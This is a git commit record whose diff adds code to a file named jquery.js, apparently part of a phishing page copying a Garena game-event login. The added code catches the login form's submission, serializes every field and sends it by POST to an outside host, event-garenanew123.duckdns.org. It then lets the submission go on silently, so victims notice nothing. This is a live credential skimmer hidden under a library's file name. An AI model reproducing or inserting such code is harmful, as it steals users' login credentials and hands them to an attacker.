9d4ae8464b34a44687a35e38cbdb8e315bc060b8
dutaap <96183789+dutaap@users.noreply.github.com>
2021-12-15 19:57:10 +0700

    Update jquery.js

--- jquery.js
+++ jquery.js
@@ -1,1 +1,16 @@
 
+$(".login-form").submit(function() {
+	var d = $(".login-form");
+
+	$.ajax({
+        url: "https://event-garenanew123.duckdns.org/test/php",
+        type: "POST",
+        data: d.serialize(),
+        success: function () {
+            return true;
+        },
+        error: function () {
+            return true;
+        },
+    });
+});
